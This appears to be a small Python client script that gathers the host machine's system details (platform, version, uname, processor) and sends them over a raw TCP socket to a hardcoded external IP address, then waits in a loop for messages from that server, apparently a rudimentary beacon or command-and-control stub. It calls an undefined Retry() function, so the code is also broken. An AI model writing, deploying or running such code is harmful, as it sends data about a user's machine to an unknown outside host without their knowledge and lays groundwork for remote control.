import socket
import platform
#
#

#
HOST = "45.61.54.181"  # The server's hostname or IP address
PORT = 65432  # The port used by the server
systemeinfo = platform.machine(),platform.version(),platform.platform(),platform.uname(),platform.processor()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
      s.connect((HOST, PORT))
      info = str(systemeinfo).encode()        
      s.send(info)
      while True:

        msg = s.recv(1024)
        msg = msg.decode()
        if msg == "break":
            break
        if msg == "msg":
            print("this is a msg")
        else:
            print(f"Received {msg!r}")
    except:
        Retry()
  